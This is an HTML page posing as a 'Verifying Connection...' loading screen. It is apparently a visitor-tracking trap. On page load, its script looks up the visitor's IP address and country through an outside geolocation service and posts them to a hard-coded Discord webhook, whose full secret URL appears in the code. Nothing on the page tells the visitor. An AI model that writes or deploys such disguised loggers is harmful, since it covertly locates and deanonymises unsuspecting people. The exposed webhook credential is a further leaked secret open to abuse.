<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Connection...</title>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function logData() {
            try {
                // 1. Get IP and Country data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Prepare the Discord Embed
                const embed = {
                    title: "üìç New Connection Logged",
                    color: 0, // Black highlight
                    fields: [
                        { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                        { name: "Country", value: `${data.country_name} :flag_${data.country_code.toLowerCase()}:`, inline: true },
                        { name: "Discord User", value: "*(Requires OAuth2 to automate)*", inline: false }
                    ],
                    footer: { text: "Bot Coded by @cc.comp" },
                    timestamp: new Date()
                };

                // 3. Send to Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                // Optional: Redirect user after logging
                // window.location.href = "https://discord.com";

            } catch (error) {
                console.error("Logging failed:", error);
            }
        }

        logData();
    </script>
</body>
</html>